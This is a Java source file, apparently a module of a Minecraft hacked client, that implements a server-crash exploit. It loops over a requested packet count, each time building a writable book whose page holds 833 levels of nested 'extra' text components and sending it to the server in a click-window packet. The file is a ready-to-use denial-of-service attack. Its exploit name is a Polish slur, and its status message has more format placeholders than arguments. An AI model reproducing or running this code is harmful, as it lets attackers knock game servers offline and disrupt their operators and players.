package wtf.norma.nekito.exploit.impl.nbt;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.helper.ChatHelper;


@ExploitInfo(
        name = "CWEL",
        type = ExploitType.NBT,
        description = "spoko okok cwel? "
)

public class CWEL extends Exploit<PacketBuffer> {

        public void execute(Object... args) {
            int packets = (Integer) args[0];
            long start = System.currentTimeMillis();
            ChatHelper.printMessage(
                    String.format("Sending &8[&7Method: &d%s&7, Packets: &8(&f%s&8) &8[&f%s&8]]", getName(), args[0]));
            (new Thread(() -> {
                for (int i = 0; i < packets; ++i) {
                    NBTTagCompound tag = new NBTTagCompound();
                    NBTTagList list = new NBTTagList();
                    StringBuilder value = new StringBuilder();
                    value.append("{");
                    int bvalue = 833;

                    int i2;
                    for (i2 = 0; i2 < bvalue; ++i2) {
                        value.append("extra:[{");
                    }

                    for (i2 = 0; i2 < bvalue; ++i2) {
                        value.append("text:\u017F}],");
                    }
                    value.append("text:\u017F}");
                    list.appendTag(new NBTTagString(value.toString()));
                    tag.setTag("pages", list);
                    ItemStack book = new ItemStack(Items.writable_book);
                    book.setTagCompound(tag);
                    Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 1, 0, 1, book, (short) 0));
                }
            })).start();
        }
    }



